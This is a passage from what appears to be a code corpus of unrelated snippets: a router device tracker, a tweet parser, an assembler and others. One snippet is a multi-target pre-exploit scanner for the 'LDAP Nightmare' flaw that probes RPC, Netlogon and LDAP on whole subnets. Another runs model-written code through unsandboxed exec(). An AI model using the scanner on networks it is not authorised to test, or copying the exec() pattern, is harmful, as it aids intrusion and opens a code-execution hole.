     arcname = child.relative_to(source)\n                if filter is None or filter(arcname):\n                    z.w",
    "\"\"\"Provide a device tracker for Mi Router.\n\nIt includes functionality to authenticate with the router,\nretrieve connected device information, and periodically update\nthe device list.\n\"\"\"\n\nimport datetime\nimport json\nimport logging\n\nimport aiohttp\nimport voluptuous as vol\n\nfrom homeassistant.components.device_tracker import (\n    CONF_SCAN_INTERVAL,\n    PLATFORM_SCHEMA as DEVICE_TRACKER_PLATFORM_SCHEMA,\n    AsyncSeeCallback,\n)\nfrom homeassistant.core import HomeAssistant\nimport homeassistant.helpers.config_validation as cv\nfrom homeassistant.helpers.event import async_track_time_interval\nfrom homeassistant.helpers.typing import ConfigType, DiscoveryInfoType\nfrom homeassistant.util import Throttle\n\nfrom .encrypt import Encrypt\n\n_LOGGER = logging.getLogger(__name__)\n# \u5b9a\u4e49\u626b\u63cf\u95f4\u9694\uff08\u5355\u4f4d\uff1a\u79d2\uff09\uff0c\u8fd9\u91cc\u8bbe\u4e3a60\u79d2\uff0c\u53ef\u6839\u636e\u5b9e\u9645\u8c03\u6574\nDEFAULT_SCAN_INTERVAL = datetime.timedelta(seconds=60)\n\nMIRouter_PLATFORM_SCHEMA = DEVICE_TRACKER_PLATFORM_SCHEMA.extend(\n    {\n        # \u8def\u7531\u5668IP\u5730\u5740\u914d\u7f6e\u9879\n        vol.Required(\"host\"): cv.string,\n        # \u8def\u7531\u5668\u5bc6\u7801\u914d\u7f6e\u9879\n        vol.Required(\"password\"): cv.string,\n        vol.Optional(\n            CONF_SCAN_INTERVAL, default=DEFAULT_SCAN_INTERVAL\n        ): cv.time_period_seconds,\n    }\n)\n\n\nclass RouterDeviceScanner:\n    \"\"\"\u4ee3\u8868\u8def\u7531\u5668\u8bbe\u5907\u626b\u63cf\u5668\u7684\u7c7b\uff0c\u7528\u4e8e\u83b7\u53d6\u8fde\u63a5\u8bbe\u5907\u4fe1\u606f.\"\"\"\n\n    def __init__(self, host: str, username: str, password: str, see) -> None:\n        \"\"\"\u521d\u59cb\u5316\u76f8\u5173\u5c5e\u6027.\"\"\"\n        _LOGGER.debug(\"\u521d\u59cb\u5316 RouterDeviceScanner\")\n        self.host = host\n        self.username = username\n        self.password = password\n        self.encryptor = Encrypt()\n        # \u521d\u59cb\u5316\u65f6\u53ef\u4ee5\u521b\u5efaEncrypt\u5bf9\u8c61\uff0c\u907f\u514d\u5728get_param\u6bcf\u6b21\u91cd\u65b0\u521b\u5efa\n        self.param_cache = None\n        self.stok = None\n        self.see = see\n        self.devices: list[dict] = []\n        self.last_results: dict = {}\n\n    def _get_param(self):\n        if not self.param_cache:\n            nonce = self.encryptor.init()\n            old_pwd = self.encryptor.old_pwd(self.password)\n            self.param_cache = {\n                \"username\": self.username,\n                \"password\": old_pwd,\n                \"logtype\": 2,\n                \"nonce\": nonce,\n            }\n        return self.param_cache\n\n    async def _get_stok(self, session):\n        param = self._get_param()\n        loginurl = f\"http://{self.host}/cgi-bin/luci/api/xqsystem/login\"\n\n        async with session.post(loginurl, data=param) as rsp:\n            if rsp.status == 200:\n                response_json = json.loads(await rsp.text())\n                self.stok = response_json.get(\"token\")\n            else:\n                _LOGGER.error(\"\u767b\u5f55\u8def\u7531\u5668\u83b7\u53d6 token \u5931\u8d25\uff0c\u72b6\u6001\u7801: %s\", rsp.status)\n\n    async def async_get_device_info(self):\n        \"\"\"\u5f02\u6b65\u83b7\u53d6\u8bbe\u5907\u8be6\u7ec6\u4fe1\u606f\uff08MAC\u3001IP\u3001\u540d\u79f0\uff09.\"\"\"\n        device_info = []\n\n        try:\n            async with aiohttp.ClientSession() as session:\n                # \u8fd9\u91cc\u9700\u8981\u66ff\u6362\u4e3a\u8def\u7531\u5668\u771f\u5b9e\u7684\u83b7\u53d6\u8bbe\u5907\u4fe1\u606f\u7684API\u5730\u5740\uff0c\u5047\u8bbe\u4e3a /api/connected_devices_info\n                # stok = await self._get_stok(session)\n                if self.stok is None:\n                    await self._get_stok(session)\n                else:\n                    url = f\"http://{self.host}/cgi-bin/luci/;stok={self.stok}/api/misystem/devicelist?mlo=1\"\n                    async with session.get(url) as response:\n                        if response.status == 200:\n                            data = json.loads(await response.text())\n                            if \"msg\" in data and data[\"msg\"] == \"Invalid token\":\n                                _LOGGER.error(\"\u83b7\u53d6\u8bbe\u5907\u4fe1\u606f\u5931\u8d25,token \u5931\u6548\")\n                                await self._get_stok(session)\n                            else:\n                                _LOGGER.debug(\"\u83b7\u53d6\u8bbe\u5907\u4fe1\u606f\u6210\u529f\")\n                                device_list = [\n                                    device\n                                    for device in data[\"list\"]\n                                    if device[\"type\"] != 0\n                                ]\n                                for device in device_list:\n                                    mac_address = device[\"mac\"]\n                                    ip_address = device[\"ip\"][0][\"ip\"]\n                                    device_name = device[\"name\"]\n                                    is_online = device[\"online\"]\n                                    device_info.append(\n                                        {\n                                            \"mac\": mac_address,\n                                            \"ip\": ip_address,\n                                            \"name\": device_name,\n                                            \"online\": is_online,\n                                        }\n                                    )\n                        else:\n                            _LOGGER.error(\n                                \"\u83b7\u53d6\u8bbe\u5907\u4fe1\u606f\u5931\u8d25\uff0c\u72b6\u6001\u7801: %s\", response.status\n                            )\n        except aiohttp.ClientError as e:\n            _LOGGER.error(\"\u8bf7\u6c42\u51fa\u73b0\u5f02\u5e38: %s\", e)\n        return device_info\n\n    @Throttle(DEFAULT_SCAN_INTERVAL)\n    async def async_update_info(self):\n        \"\"\"\u5f02\u6b65\u66f4\u65b0\u8bbe\u5907\u4fe1\u606f\uff0c\u8c03\u7528\u83b7\u53d6\u8bbe\u5907\u4fe1\u606f\u65b9\u6cd5\u5e76\u4fdd\u5b58\u7ed3\u679c.\"\"\"\n        self.devices = ",
    "import socket\nimport argparse\nimport threading\nimport time\nimport ipaddress\nfrom concurrent.futures import ThreadPoolExecutor\nfrom impacket.dcerpc.v5 import transport, nrpc\n\nclass ExploitChecker:\n    def __init__(self, target_ip):\n        self.target_ip = target_ip\n        self.results = {\n            \"ldap_connect\": False,\n            \"rpc_connect\": False,\n            \"netlogon_service\": False,\n            \"ldap_callback\": False\n        }\n\n    def check_rpc_port(self, port=49664):\n        try:\n            rpctransport = transport.DCERPCTransportFactory(f'ncacn_ip_tcp:{self.target_ip}[{port}]')\n            dce = rpctransport.get_dce_rpc()\n            dce.connect()\n            try:\n                dce.bind(nrpc.MSRPC_UUID_NRPC)\n                self.results[\"netlogon_service\"] = True\n            except:\n                pass\n            dce.disconnect()\n            self.results[\"rpc_connect\"] = True\n            return True\n        except:\n            return False\n\n    def check_ldap_port(self, port=389):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(2)\n            result = sock.connect_ex((self.target_ip, port))\n            sock.close()\n            self.results[\"ldap_connect\"] = (result == 0)\n            return self.results[\"ldap_connect\"]\n        except:\n            return False\n\n    def ldap_callback_listener(self):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            sock.bind(('0.0.0.0', 389))\n            sock.settimeout(5)\n            while not self.results[\"ldap_callback\"]:\n                try:\n                    data, addr = sock.recvfrom(1024)\n                    if addr[0] == self.target_ip:\n                        self.results[\"ldap_callback\"] = True\n                        break\n                except socket.timeout:\n                    break\n            sock.close()\n        except Exception as e:\n            print(f\"LDAP Listener Error: {str(e)}\")\n\n    def run_checks(self):\n        print(f\"\\n[*] Checking {self.target_ip}\")\n        \n        listener_thread = threading.Thread(target=self.ldap_callback_listener)\n        listener_thread.daemon = True\n        listener_thread.start()\n\n        with ThreadPoolExecutor(max_workers=3) as executor:\n            executor.submit(self.check_rpc_port)\n            executor.submit(self.check_ldap_port)\n        \n        time.sleep(6)\n        \n        can_exploit = all(self.results.values())\n        status = \"Potentially Vulnerable\" if can_exploit else \"Not Vulnerable\"\n        \n        print(f\"[{self.target_ip}]\")\n        print(f\"\u251c\u2500\u2500 RPC (49664): {'\u2713' if self.results['rpc_connect'] else '\u2717'}\")\n        print(f\"\u251c\u2500\u2500 LDAP (389): {'\u2713' if self.results['ldap_connect'] else '\u2717'}\")\n        print(f\"\u251c\u2500\u2500 Netlogon: {'\u2713' if self.results['netlogon_service'] else '\u2717'}\")\n        print(f\"\u251c\u2500\u2500 Callbacks: {'\u2713' if self.results['ldap_callback'] else '\u2717'}\")\n        print(f\"\u2514\u2500\u2500 Status: {status}\\n\")\n        \n        return can_exploit\n\ndef check_targets(targets):\n    vulnerable_hosts = []\n    for ip in targets:\n        checker = ExploitChecker(str(ip))\n        if checker.run_checks():\n            vulnerable_hosts.append(str(ip))\n    return vulnerable_hosts\n\ndef parse_ip_input(ip_input):\n    try:\n        return list(ipaddress.ip_network(ip_input, strict=False).hosts())\n    except ValueError:\n        try:\n            return [ipaddress.ip_address(ip_input)]\n        except ValueError:\n            with open(ip_input, 'r') as f:\n                return [ipaddress.ip_address(line.strip()) for line in f if line.strip()]\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Multi-target LDAP Nightmare Pre-Exploit Checker\")\n    parser.add_argument(\"target\", help=\"Target IP, subnet (CIDR), or file with IP list\")\n    parser.add_argument(\"-o\", \"--output\", help=\"Output file for vulnerable hosts\")\n    args = parser.parse_args()\n\n    try:\n        targets = parse_ip_input(args.target)\n        print(f\"[*] Loaded {len(targets)} targets\")\n        \n        vulnerable_hosts = check_targets(targets)\n        \n        print(\"\\n[+] Scan Complete\")\n        print(f\"[+] Found {len(vulnerable_hosts)} potentially vulnerable hosts\")\n        \n        if args.output and vulnerable_hosts:\n            with open(args.output, 'w') as f:\n                for host in vulnerable_hosts:\n                    f.write(f\"{host}\\n\")\n            print(f\"[+] Results saved to {args.output}\")\n\n    except Exception as e:\n        print(f\"[-] Error: {str(e)}\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import dataloader.Dataset_rgb as D_rgb\nimport dataloader.Dataset_flow as D_flow\nimport torch\nimport torch.utils.data\nimport train\n\n\nclass ba_evaluator(object):\n    def __init__(self, conf, fl_server, path, device, top_k=5):\n        self.ba_flow = None\n        self.ba_rgb = None\n        self.conf = conf\n        data = conf['data_type']\n        self.rgb = conf['rgb']\n        self.flow = conf['flow']\n        self.device = device\n        self.server = fl_server\n        self.path = path\n        self.top_k = top_k\n        adv = conf['adv']\n        if adv:\n            t = '-adv'\n        else:\n            t = '-poi'\n        if self.rgb:\n            self.ba_test_rgb = D_rgb.UCF101(path[data + '-class_idx'], split=path[data + '-ba_test_split'],\n                                            frames_root=path[data + '_ba_test_frames'+t],\n                                            train=False, flip=False, poi_tar=conf['poi_target'])\n            self.ba_rgb = torch.utils.data.DataLoader(self.ba_test_rgb, batch_size=conf['batch_size'],\n                                                      num_workers=conf['num_worker'], shuffle=False)\n        if self.flow:\n            self.ba_test_flow = D_flow.UCF101_FLOW(path[data + '-class_idx'], split=path[data + '-ba_test_split'],\n                                                   flow_root=path[data + '_ba_test_flows'],\n                                                   train=False, flip=False, poi_tar=conf['poi_target'])\n            self.ba_flow = torch.utils.data.DataLoader(self.ba_test_flow, batch_size=conf['batch_size'],\n                                                       num_workers=conf['num_worker'], shuffle=False)\n\n    def ba_evaluate(self, e):\n        rgb_sf = None\n        flow_sf = None\n        t1 = None\n        if self.rgb:\n            rgb_sf, t1 = self.server.evaluate_single_model(self.server.global_rgb, self.ba_rgb, 'Backdoor-rgb', e)\n        if self.flow:\n            flow_sf, t2 = self.server.evaluate_single_model(self.server.global_flow, self.ba_flow, 'Backdoor-flow', e)\n        if self.rgb and self.flow:\n            ts_acc_t1, ts_acc_tk = train.two_stream_test(rgb_sf, flow_sf, t1, len(self.ba_test_rgb))\n            print('Backdoor Two Stream Top1 Acc %f, Top%d Acc %f\\n' % (ts_acc_t1, self.top_k, ts_acc_tk))\n            self.server.writer.add_scalar(\"Backdoor Two Stream Top1 Acc\", ts_acc_t1, e)",
    "import time\nfrom datetime import datetime\n\nfrom bs4 import BeautifulSoup\nfrom re import findall\nfrom json import loads\n\nimport logging as logme\n\nfrom .tweet import utc_to_local, Tweet_formats\n\n\nclass NoMoreTweetsException(Exception):\n    def __init__(self, msg):\n        super().__init__(msg)\n\n\ndef Follow(response):\n    logme.debug(__name__ + ':Follow')\n    soup = BeautifulSoup(response, \"html.parser\")\n    follow = soup.find_all(\"td\", \"info fifty screenname\")\n    cursor = soup.find_all(\"div\", \"w-button-more\")\n    try:\n        cursor = findall(r'cursor=(.*?)\">', str(cursor))[0]\n    except IndexError:\n        logme.critical(__name__ + ':Follow:IndexError')\n\n    return follow, cursor\n\n\n# TODO: this won't be used by --profile-full anymore. if it isn't used anywhere else, perhaps remove this in future\ndef Mobile(response):\n    logme.debug(__name__ + ':Mobile')\n    soup = BeautifulSoup(response, \"html.parser\")\n    tweets = soup.find_all(\"span\", \"metadata\")\n    max_id = soup.find_all(\"div\", \"w-button-more\")\n    try:\n        max_id = findall(r'max_id=(.*?)\">', str(max_id))[0]\n    except Exception as e:\n        logme.critical(__name__ + ':Mobile:' + str(e))\n\n    return tweets, max_id\n\n\ndef MobileFav(response):\n    soup = BeautifulSoup(response, \"html.parser\")\n    tweets = soup.find_all(\"table\", \"tweet\")\n    max_id = soup.find_all(\"div\", \"w-button-more\")\n    try:\n        max_id = findall(r'max_id=(.*?)\">', str(max_id))[0]\n    except Exception as e:\n        print(str(e) + \" [x] feed.MobileFav\")\n\n    return tweets, max_id\n\n\ndef _get_cursor(response):\n    try:\n        next_cursor = response['timeline']['instructions'][0]['addEntries']['entries'][-1]['content'][\n            'operation']['cursor']['value']\n    except KeyError:\n        # this is needed because after the first request location of cursor is changed\n        next_cursor = response['timeline']['instructions'][-1]['replaceEntry']['entry']['content']['operation'][\n            'cursor']['value']\n    return next_cursor\n\n\ndef Json(response):\n    logme.debug(__name__ + ':Json')\n    json_response = loads(response)\n    html = json_response[\"items_html\"]\n    soup = BeautifulSoup(html, \"html.parser\")\n    feed = soup.find_all(\"div\", \"tweet\")\n    return feed, json_response[\"min_position\"]\n\n\ndef parse_tweets(config, response):\n    logme.debug(__name__ + ':parse_tweets')\n    response = loads(response)\n    if len(response['globalObjects']['tweets']) == 0:\n        msg = 'No more data!'\n        raise NoMoreTweetsException(msg)\n    feed = []\n    for timeline_entry in response['timeline']['instructions'][0]['addEntries']['entries']:\n        # this will handle the cases when the timeline entry is a tweet\n        if (config.TwitterSearch or config.Profile) and (timeline_entry['entryId'].startswith('sq-I-t-') or\n                                                         timeline_entry['entryId'].startswith('tweet-')):\n            if 'tweet' in timeline_entry['content']['item']['content']:\n                _id = timeline_entry['content']['item']['content']['tweet']['id']\n                # skip the ads\n                if 'promotedMetadata' in timeline_entry['content']['item']['content']['tweet']:\n                    continue\n            elif 'tombstone' in timeline_entry['content']['item']['content'] and 'tweet' in \\\n                    timeline_entry['content']['item']['content']['tombstone']:\n                _id = timeline_entry['content']['item']['content']['tombstone']['tweet']['id']\n            else:\n                _id = None\n            if _id is None:\n                raise ValueError('Unable to find ID of tweet in timeline.')\n            try:\n                temp_obj = response['globalObjects']['tweets'][_id]\n            except KeyError:\n                logme.info('encountered a deleted tweet with id {}'.format(_id))\n\n                config.deleted.append(_id)\n                continue\n            temp_obj['user_data'] = response['globalObjects']['users'][temp_obj['user_id_str']]\n            if 'retweeted_status_id_str' in temp_obj:\n                rt_id = temp_obj['retweeted_status_id_str']\n                _dt = response['globalObjects']['tweets'][rt_id]['created_at']\n                _dt = datetime.strptime(_dt, '%a %b %d %H:%M:%S %z %Y')\n                _dt = utc_to_local(_dt)\n                _dt = str(_dt.strftime(Tweet_formats['datetime']))\n                temp_obj['retweet_data'] = {\n                    'user_rt_id': response['globalObjects']['tweets'][rt_id]['user_id_str'],\n                    'user_rt': response['globalObjects']['tweets'][rt_id]['full_text'],\n                    'retweet_id': rt_id,\n                    'retweet_date': _dt,\n                }\n            feed.append(temp_obj)\n    next_cursor = _get_cursor(response)\n    return feed, next_cursor\n",
    "from sympy import *\r\nimport math\r\ninit_printing(use_unicode=True)\r\n\r\n\r\ndef simplify(formula_in):\r\n    def open_brackets(formula):\r\n        if formula.find(\"(\") >= 0:\r\n            formula_br = temp = \"\"\r\n            m = 1\r\n            for i in range(0, len(formula)):\r\n                if i + 1 < len(formula):\r\n                    if formula[i].isalpha() and (formula[i + 1].isupper() or formula[i + 1] == \"(\" or formula[i + 1] == \")\"):\r\n                        temp += formula[i] + \"1\"\r\n                    elif formula[i] == \")\" and formula[i + 1].isalpha():\r\n                        temp += formula[i] + \"1\"\r\n                    else:\r\n                        temp += formula[i]\r\n                else:\r\n                    if formula[i].isalpha():\r\n                        temp += formula[i] + \"1\"\r\n                    elif formula[i] == \")\":\r\n                        temp += formula[i] + \"1\"\r\n                    else:\r\n                        temp += formula[i]\r\n            formula = str(temp)\r\n            for i in range(formula.index(\")\"), len(formula)):\r\n                if str(formula[i]).isalpha() or str(formula[i]).isspace() or i == len(formula) - 1:\r\n                    if (i == len(formula) - 1):\r\n                        i += 1\r\n                    formula_br = formula[formula.index(\"(\"):i]\r\n                    break\r\n            m *= (int(formula_br[formula_br.index(\")\") + 1:]))\r\n            val = \"\"\r\n            temp = formula_br\r\n            i = 1\r\n            while i < temp.index(\")\") + 1:\r\n                if temp[i].isdigit():\r\n                    val += str(temp[i])\r\n                else:\r\n                    if len(val) > 0:\r\n                        temp = temp.replace(\r\n                            temp[1:i], (temp[1:i - len(val)] + str(int(val) * m)))\r\n                        val = \"\"\r\n                i += 1\r\n            formula = formula.replace(formula_br, temp[1: temp.index(\")\")])\r\n        return formula\r\n\r\n\r\n    if formula_in.find(\".\") >= 0:\r\n        formula_in = formula_in[0: formula_in.index(\r\n            \".\")] + \".\" + open_brackets(formula_in[formula_in.index(\".\") + 1:])\r\n        d = \"\"\r\n        for i in range(formula_in.index(\".\") + 1, len(formula_in)):\r\n            if formula_in[i].isdigit():\r\n                d += formula_in[i]\r\n            else:\r\n                break\r\n        formula_in = formula_in[:formula_in.index(\r\n            \".\")] + open_brackets(\"(\" + formula_in[formula_in.index(\".\") + len(d) + 1:] + \")\" + d)\r\n    formula_in = open_brackets(formula_in)\r\n    return formula_in\r\n\r\n\r\ndef find_lcm(num1, num2):  # function to find the lcm of a list of numbers\r\n    lcm = int(int(num1 * num2) / int(math.gcd(num1, num2)))\r\n    return lcm\r\n\r\n\r\ndef sub_script(s):\r\n    for i in range(1, len(s)):\r\n        if s[i].isdigit() and (s[i - 1].isalpha() or s[i - 1] == \")\"):\r\n            s = s[0:i] + s[i].replace(\"0\", \"\\u2080\").replace(\"1\", \"\\u2081\").replace(\"2\", \"\\u2082\").replace(\"3\", \"\\u2083\").replace(\"4\", \"\\u2084\").replace(\r\n                \"5\", \"\\u2085\").replace(\"6\", \"\\u2086\").replace(\"7\", \"\\u2087\").replace(\"8\", \"\\u2088\").replace(\"9\", \"\\u2089\") + s[i + 1:]\r\n    return s\r\n\r\n\r\nclass compound(object):  # A class of compounds. It stores all the relevant data for the compound\r\n    def __init__(self, n_compound):\r\n        self.n_compound = str(n_compound)\r\n        self.f_compound = simplify((str(n_compound)))\r\n        temp = \"\"\r\n        e = \"\"\r\n        v = \"0\"\r\n        self.element = []\r\n        self.val = []\r\n        for i in range(0, len(self.f_compound) - 1):\r\n            if self.f_compound[i].isalpha() and self.f_compound[i + 1].isupper():\r\n                temp += self.f_compound[i] + \"1\"\r\n            else:\r\n                temp += self.f_compound[i]\r\n        temp += self.f_compound[len(self.f_compound) - 1]\r\n        if temp[len(temp) - 1].isalpha():\r\n            temp += \"1\"\r\n        self.f_compound = temp\r\n        for i in range(0, len(self.f_compound)):\r\n            if self.f_compound[i].isalpha():\r\n                if v != \"0\":\r\n                    if e in self.element:\r\n                        self.val[self.element.index(e)] = int(\r\n                            self.val[self.element.index(e)]) + int(v)\r\n                    else:\r\n                        self.element.append(str(e))\r\n                        self.val.append(int(v))\r\n                    e = self.f_compound[i]\r\n                    v = \"0\"\r\n                    i -= 1\r\n                else:\r\n                    e += self.f_compound[i]\r\n            elif self.f_compound[i].isdigit():\r\n                v += self.f_compound[i]\r\n\r\n        if e in self.element:\r\n            self.val[self.element.index(e)] = int(\r\n                self.val[self.element.index(e)]) + int(v)\r\n        else:\r\n            self.element.append(str(e))\r\n            self.val.append(int(v))\r\n\r\n\r\nequation = str(input(\"Enter a chemical equation: \"))\r\n\r\nequation = equation.replace(\"->\", \"+\").replace(' ', '')\r\ncompounds = []  # An array of compounds\r\nelements = []  # An array of all",
    "import re  # to use regexes in confirming input (emails)\r\nfrom flask import redirect, render_template, session\r\nfrom functools import wraps\r\nfrom datetime import datetime\r\n\r\n# Code snippet taken from problem set 9 - finance - (CS50X 2024)\r\ndef login_required(f):\r\n    \"\"\"\r\n    Decorate routes to require login.\r\n\r\n    https://flask.palletsprojects.com/en/latest/patterns/viewdecorators/\r\n    \"\"\"\r\n\r\n    @wraps(f)\r\n    def decorated_function(*args, **kwargs):\r\n        if session.get(\"login_success\") is None:\r\n            return redirect(\"/login\")\r\n        return f(*args, **kwargs)\r\n\r\n    return decorated_function\r\n\r\n\r\ndef verified_user_required(f):\r\n    \"\"\"\r\n    Decorator to enforce that a user is verified.\r\n\r\n    This ensures that the session variable 'user_verified' is set\r\n    to a value other than 'None'. If the user is not verified,\r\n    they are redirected to the '/verify' route.\r\n    \"\"\"\r\n\r\n    @wraps(f)\r\n    def decorated_function(*args, **kwargs):\r\n        if session.get(\"user_verified\") is None:\r\n            return redirect(\"/verify\")\r\n        return f(*args, **kwargs)\r\n\r\n    return decorated_function\r\n\r\n\r\ndef user_email_required(f):\r\n    \"\"\"\r\n    Decorator to require a user's email.\r\n\r\n    This checks if the 'user_email' session variable is set.\r\n    If not, the user is redirected to the '/verify' route.\r\n    \"\"\"\r\n\r\n    @wraps(f)\r\n    def decorated_function(*args, **kwargs):\r\n        if session.get(\"user_email\") is None:\r\n            return redirect(\"/verify\")\r\n        return f(*args, **kwargs)\r\n\r\n    return decorated_function\r\n\r\n\r\n# Code snippet taken from problem set 9 - finance - (CS50X 2024)\r\ndef apology(message, code=400):\r\n    \"\"\"Render message as an apology to user\"\"\"\r\n\r\n    def escape(s):\r\n        \"\"\"\r\n        Escape special characters.\r\n\r\n        https://github.com/jacebrowning/memegen#special-characters\r\n        \"\"\"\r\n        for old, new in [\r\n            (\"-\", \"--\"),\r\n            (\" \", \"-\"),\r\n            (\"_\", \"__\"),\r\n            (\"?\", \"~q\"),\r\n            (\"%\", \"~p\"),\r\n            (\"#\", \"~h\"),\r\n            (\"/\", \"~s\"),\r\n            ('\"', \"''\"),\r\n        ]:\r\n            s = s.replace(old, new)\r\n        return s\r\n\r\n    return render_template(\"apology.html\", top=code, bottom=escape(message)), code\r\n\r\n\r\ndef get_date() -> str:\r\n    \"\"\"Returns the current date in the form of: year-month-day\"\"\"\r\n    time = datetime.now()\r\n    current_date = f\"{time.year}-{time.month}-{time.day}\"\r\n    return current_date\r\n\r\n\r\ndef get_time() -> str:\r\n    \"\"\"Returns the current time in the form of: hour:minutes:seconds\"\"\"\r\n    time = datetime.now()\r\n    current_time = f\"{time.hour}:{time.minute}:{time.second}\"\r\n    return current_time\r\n\r\n\r\ndef validate_email(email: str) -> bool:\r\n    \"\"\"\r\n    Validate an email address.\r\n\r\n    Checks if the given email matches the required pattern:\r\n    - Starts with letters.\r\n    - May include dots, underscores, or hyphens.\r\n    - Ends with '@beemail.hive'.\r\n    Returns True if the email is valid, otherwise False.\r\n    \"\"\"\r\n    pattern = r\"^[a-zA-Z]+[-_.a-zA-Z0-9]*@beemail.hive$\"\r\n    match = re.search(pattern, email)\r\n    if match:\r\n        return True\r\n    else:\r\n        return False",
    "import pandas as pd\nimport json\nimport os\nfrom openai import OpenAI\nimport io\nimport sys\nimport contextlib\n\ndef execute_python_code(code):\n    output = io.StringIO()\n    with contextlib.redirect_stdout(output):\n        try:\n            exec(code)\n            return output.getvalue().strip()\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\ndef solve_with_python(problem, client, model, max_iterations=5):\n    messages = []\n    iteration = 0\n    \n    system_prompt = \"\"\"You are an expert mathematical problem solver. Follow these steps:\n1. First analyze if the problem can be solved with Python code.\n2. If yes, provide clear, executable Python code with necessary imports.\n3. If not, break down into smaller sub-problems.\n4. For answers, provide:\n   - Both symbolic expression AND numerical value when possible\n   - Start with 'CONFIDENT:' if you're sure of the answer\n   - Use LaTeX for mathematical expressions (e.g., $\\frac{3}{4}$)\n5. Keep track of intermediate results and build upon them.\n6. Verify your solutions when possible.\"\"\"\n\n    messages.append({\n        \"role\": \"system\",\n        \"content\": system_prompt\n    })\n    messages.append({\n        \"role\": \"user\",\n        \"content\": f\"Problem: {problem}\\nAnalyze and solve this problem. If possible, provide Python code. Otherwise, break it down into steps.\"\n    })\n    \n    solution_attempts = []\n    subquestions = []\n    \n    while iteration < max_iterations:\n        completion = client.chat.completions.create(\n            model=model,\n            messages=messages,\n            temperature=0.7,\n            max_tokens=1000\n        )\n        \n        response = completion.choices[0].message.content\n        solution_attempts.append(response)\n        messages.append({\"role\": \"assistant\", \"content\": response})\n        \n        if response.startswith(\"CONFIDENT:\"):\n            return {\n                \"final_answer\": response.replace(\"CONFIDENT:\", \"\").strip(),\n                \"iterations\": iteration + 1,\n                \"solution_attempts\": solution_attempts,\n                \"subquestions\": subquestions\n            }\n        \n        if \"Step\" in response or \"Problem\" in response:\n            for line in response.split('\\n'):\n                if (line.startswith(('Step', 'Problem', '\u2022', '-', '*')) or \n                    any(str(i) + '.' in line for i in range(1, 10))):\n                    subquestions.append(line.strip())\n        \n        if \"```python\" in response:\n            code_blocks = response.split(\"```python\")\n            for block in code_blocks[1:]:\n                code = block.split(\"```\")[0].strip()\n                execution_result = execute_python_code(code)\n                \n                messages.append({\n                    \"role\": \"user\",\n                    \"content\": f\"The Python code execution resulted in: {execution_result}\\n\"\n                             \"Based on this result, please provide:\\n\"\n                             \"1. The mathematical expression (using LaTeX if needed)\\n\"\n                             \"2. The numerical value\\n\"\n                             \"Start with 'CONFIDENT:' if you're sure of both.\"\n                })\n        else:\n            messages.append({\n                \"role\": \"user\",\n                \"content\": \"Can any part be solved with Python now? If yes, provide the code. \"\n                          \"If not, continue breaking down the problem. \"\n                          \"Remember to provide both expression and numerical forms when possible.\"\n            })\n        \n        iteration += 1\n        \n        if iteration >= max_iterations:\n            messages.append({\n                \"role\": \"system\",\n                \"content\": \"Provide your final answer now, including both expression and numerical value if possible. \"\n                          \"Start with 'CONFIDENT:' if you're sure.\"\n            })\n            final_completion = client.chat.completions.create(\n                model=model,\n                messages=messages,\n                temperature=0.7,\n                max_tokens=100\n            )\n            return {\n                \"final_answer\": final_completion.choices[0].message.content.replace(\"CONFIDENT:\", \"\").strip(),\n                \"iterations\": iteration,\n                \"solution_attempts\": solution_attempts,\n                \"subquestions\": subquestions\n            }\n    \n    return None\n\ndef read_config(config_file='config.json'):\n    with open(config_file, 'r') as f:\n        config = json.load(f)\n    return config\n\ndef main():\n    config = read_config()\n    \n    # Load the dataset\n    df = pd.read_json(config['input_file'], lines=False)\n    \n    client = OpenAI(base_url=config['base_url'], api_key=config['api_key'])\n   \n    results = []\n    \n    # Load existing results if the file exists\n    if os.path.exists(config['output_file']):\n        with open(config['output_file'], 'r') as f:\n            results = json.load(f)\n    \n    start_index = len(results)\n    \n    try:\n        for i in r",
    "import sys\n\n# \u64cd\u4f5c\u78bc\u8868 (OPTAB)\nOPTAB = {\n    \"LDA\": \"00\", \"STA\": \"0C\", \"LDX\": \"04\", \"STX\": \"10\",\n    \"COMP\": \"28\", \"JEQ\": \"30\", \"JSUB\": \"48\", \"J\": \"3C\",\n    \"CLEAR\": \"B4\", \"TIXR\": \"B8\", \"RD\": \"D8\", \"WD\": \"DC\",\n    \"TD\": \"E0\", \"STCH\": \"54\", \"LDCH\": \"50\", \"RSUB\": \"4C\",\n    \"LDT\": \"74\", \"STL\": \"14\", \"LDB\": \"68\", \"JLT\": \"38\",\n    \"COMPR\": \"A0\"\n}\n\nREGISTER_TABLE = {\n    \"A\": 0, \"X\": 1, \"L\": 2, \"B\": 3, \"S\": 4, \"T\": 5, \"F\": 6\n}\n\ndef assembler(file_path):\n    print(\"=== Step 1: \u5f9e\u6a94\u6848\u8b80\u53d6\u8f38\u5165 ===\")\n    try:\n        with open(file_path, 'r') as asm_file:\n            lines = [line.strip() for line in asm_file if line.strip()]\n    except FileNotFoundError:\n        print(f\"\u932f\u8aa4: \u7121\u6cd5\u627e\u5230\u6a94\u6848 {file_path}\")\n        sys.exit(1)\n\n    print(f\"\u6210\u529f\u8b80\u53d6\u6a94\u6848: {file_path}\")\n\n    # \u521d\u59cb\u5316\u7d44\u8b6f\u5668\n    location_counter = 0\n    symbol_table = {}\n    text_records = []\n    modification_records = []\n    current_text = \"\"\n    text_start_address = None\n    base_register = None\n    program_start = None\n    program_name = \"\"  # \u65b0\u589e\u8b8a\u6578\u5132\u5b58\u7a0b\u5f0f\u540d\u7a31\n    header_record = None\n    end_record = None\n    last_address = 0\n    FIXED_TEXT_RECORD_LENGTH = 60\n\n    # \u7b2c\u4e00\u968e\u6bb5: \u89e3\u6790\u8f38\u5165\u4ee3\u78bc\uff0c\u751f\u6210\u7b26\u865f\u8868\n    print(\"\\n=== Step 2: \u89e3\u6790\u8f38\u5165\u4ee3\u78bc ===\")\n    for line in lines:\n        parts = line.split()\n        if len(parts) == 3:\n            label, opcode, operand = parts\n        elif len(parts) == 2:\n            label, opcode, operand = None, *parts\n        else:\n            label, opcode, operand = None, parts[0], None\n\n        if opcode == \"START\":\n            program_name = label  # \u8b80\u53d6\u7a0b\u5f0f\u540d\u7a31\n            program_start = int(operand, 16)\n            location_counter = program_start\n            print(f\"\u7a0b\u5f0f\u540d\u7a31: {program_name}, 